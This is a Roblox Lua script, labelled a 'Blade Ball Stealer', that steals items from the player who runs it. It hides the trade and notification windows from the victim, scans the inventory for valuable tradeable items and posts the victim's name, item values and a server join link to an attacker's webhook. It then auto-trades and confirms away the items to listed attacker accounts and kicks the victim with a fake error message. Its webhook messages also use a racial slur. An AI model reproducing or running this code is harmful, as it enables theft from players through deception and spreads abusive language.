_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Paramètres
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "EBK-SS-A" 

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false

-- Sécurité de base
if next(users) == nil or webhook == "" then
    plr:kick("Configuration manquante (Usernames/Webhook)")
    return
end

-- Masquer les interfaces pour la victime
pcall(function()
    tradeGui.Enabled = false
    PlayerGui.Notifications.Enabled = false
    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        inTrade = tradeGui.Enabled
        if inTrade then tradeGui.Enabled = false end
    end)
end)

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Fonction pour formater le RAP (k, m, b)
local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Calcul du RAP Total
local function getRAP(category, itemName)
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

---------------------------------------------------------
-- GESTION DES EMBEDS (VIOLET ET JAUNE)
---------------------------------------------------------

-- 1. Embed VIOLET (Exécution du script)
local function SendJoinMessage(list, prefix)
    local totalRAP = 0
    local itemLines = ""
    for _, item in ipairs(list) do
        totalRAP = totalRAP + item.RAP
        itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. " RAP]\n"
    end

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (prefix ~= "") and prefix .. " game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')" or nil,
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
                {name = "🔗 Join link:", value = "[Click to Join Server](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false},
                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"},
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- 2. Embed JAUNE (Quand tu rejoins le serveur)
local function SendOnServerMessage()
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do totalRAP = totalRAP + item.RAP end

    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "⚠️ The nigga is on the server !",
            ["color"] = 16776960, -- JAUNE
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"},
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

---------------------------------------------------------
-- SYSTÈME DE TRADE AUTOMATIQUE (FIXÉ)
---------------------------------------------------------

local function startAutoTrade(targetPlayer)
    task.spawn(function()
        table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)

        while #itemsToSend > 0 do
            -- Envoi d'une seule requête et attente
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
            
            local waitTime = 0
            repeat task.wait(1) waitTime = waitTime + 1 until inTrade or waitTime > 30
            
            if inTrade then
                task.wait(2) -- Délai pour stabiliser le trade et éviter le déclin auto
                
                local limit = 0
                while #itemsToSend > 0 and limit < 50 do
                    local item = table.remove(itemsToSend, 1)
                    pcall(function()
                        netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                    end)
                    limit = limit + 1
                    task.wait(0.2)
                end

                task.wait(1)
                -- Confirmation Automatique
                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                task.wait(1)
                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                
                repeat task.wait(1) until not inTrade
                task.wait(2) -- Pause entre deux trades
            end
        end
        task.wait(1)
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end)
end

---------------------------------------------------------
-- LANCEMENT
---------------------------------------------------------

-- Scan de l'inventaire
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    local prefix = (ping == "Yes") and "@everyone | " or ""
    SendJoinMessage(itemsToSend, prefix)

    local function checkUsers()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                SendOnServerMessage()
                startAutoTrade(p)
                return true
            end
        end
        return false
    end

    if not checkUsers() then
        Players.PlayerAdded:Connect(function(player)
            if table.find(users, player.Name) then
                SendOnServerMessage()
                startAutoTrade(player)
            end
        end)
    end
end
